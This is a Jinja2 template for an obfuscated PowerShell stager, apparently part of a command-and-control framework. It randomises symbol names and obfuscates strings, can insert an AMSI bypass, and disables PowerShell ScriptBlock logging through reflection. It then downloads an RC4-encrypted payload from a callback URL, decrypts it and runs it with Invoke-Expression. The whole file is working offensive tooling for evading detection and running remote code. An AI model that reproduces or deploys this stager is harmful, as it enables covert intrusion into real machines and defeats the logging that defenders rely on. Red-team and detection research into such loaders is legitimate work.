{% from 'macros.jinja2' import obfuscate with context%}
${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")

{% include "powershell/rc4.ps1" %}


function {{symbol_name("Decrypt-String")}} {
    param(
        [System.String]$string, [Bool]$Code=$False
  	)
    $result = [System.Convert]::FromBase64String($string)
    $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
    if (-not $Code) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
    $result
}

{% if exec_clipboard_entry %}
    ${{symbol_name("clip_entry")}} = "{{exec_clipboard_entry|rc4encrypt}}"
{% else %}
    ${{symbol_name("clip_entry")}} = ""
{% endif %}

if ($PSVersionTable.PSVersion.Major -ge 5) {
    {% if amsibypass %}
        {% include amsibypass %}
    {% endif %}

    {# Disable Logging. See https://www.cobbr.io/ScriptBlock-Logging-Bypass.html
        $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
        $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
        $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
    #}

    ${{symbol_name("settings")}} = [Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}({{obfuscate("System.Management.Automation.Utils")}}).GetField({{obfuscate("cachedGroupPolicySettings")}},{{obfuscate("NonPublic,Static")}}).GetValue($null);
    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}] = @{}
    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockLogging")}},{{obfuscate("0")}})
    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockInvocationLogging")}},{{obfuscate("0")}})
}

{% if transport in ['http', 'https'] %}
    ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
    function {{symbol_name("Transport-String")}} {
        param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
        $args = "?t={{transport}}"
        foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.{{obfuscate("DownloadString")}}("${{symbol_name("CALLBACK_URL")}}${1}${args}")) $3
    }
{% elif transport == 'smb' %}
    {# TODO #}
{% elif transport == 'dns' %}
    {# TODO #}
{% endif %}

${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "h"


& (g`Cm {{obfuscate("Invoke-Expression")}}) ${{symbol_name("Code")}}
